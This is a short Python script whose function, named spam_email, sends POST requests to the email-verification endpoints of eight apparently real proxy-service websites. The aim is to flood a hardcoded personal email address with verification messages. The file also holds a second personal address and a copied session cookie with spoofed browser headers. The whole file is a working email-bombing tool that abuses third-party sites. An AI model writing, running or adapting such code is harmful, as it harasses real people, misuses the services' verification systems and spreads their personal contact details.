import requests

def spam_email():
    url = ['https://www.666yun.men/api/v1/passport/comm/sendEmailVerify',
           'https://www.dageyun.net/api/v1/passport/comm/sendEmailVerify',
           'https://portal.duangcloud.xyz/api/v1/passport/comm/sendEmailVerify',
           'https://wyy.netyi.cloud/api/v1/passport/comm/sendEmailVerify',
           'https://ikuuu.ltd/auth/send',
           'https://xn--gmqz83awjh.com/auth/send',
           'https://www.94ish.men/api/v1/passport/comm/sendEmailVerify',
           'https://www.huojianyun.net/auth/send'
           ]
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-language': 'zh-CN',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': '_ga=GA1.1.689909611.1643493149; crisp-client%2Fsession%2Ffa4e50ca-d931-4abe-b56e-b4e28cfae87d=session_ab27321c-6819-4172-af47-3b96e51e0ecd; _ga_P1E9Z5LRRK=GS1.1.1652835383.21.1.1652835740.0; v2board_session=eyJpdiI6IndORFhNZitwbXF3ZitvMzY3VW02UVE9PSIsInZhbHVlIjoia1lHSzIwU3Q3dU92MmtaK0xKNnRnMlM2c3NMMVcvSnhHRXB3RFd1NGVWd3dobVFOZVBoUDlrVEUvcU93UERIMnFmVEcvK29udWxmNkFNcmluN1RTbzRuNkNPYU56QmYzSUFBOFRtRU5HQ2FCUkcwM3NvTVpnMkIzdEdzSVNWVUIiLCJtYWMiOiIwY2NiOWM1MDkxYjE5MjYxNThlNmEyYmJhMTMzZTE5MjgzNGU2MDZjYzQ1MTJjNjEyOGRjNzBmZDg3MzViOWI4In0%3D',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
    }
    payload = 'email=louyuankun%40126.com'
    payload2 = 'email=1203141609@qq.com'
    for u in url:
        res = requests.post(url=u, headers=headers, data=payload).json()
        print(res)

if __name__ == '__main__':
    spam_email()
